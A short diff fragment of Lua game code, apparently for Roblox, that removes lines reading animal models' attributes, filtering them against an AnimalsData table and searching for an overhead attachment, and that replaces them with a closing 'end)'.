-            -- Use the Index attribute for internal name (same as AnimalController uses)
-            local internalName = animalModel:GetAttribute("Index") or animalModel.Name
-            local mutation = animalModel:GetAttribute("Mutation")
-            
-            -- FILTER: Only include if it's a known animal in AnimalsData
-            if not AnimalsData[internalName] then
-                continue
-            end
-            
-            -- Find the overhead attachment (quick non-recursive search first)
-            local overheadAttachment = animalModel:FindFirstChild("OVERHEAD_ATTACHMENT")
-            if not
+end)
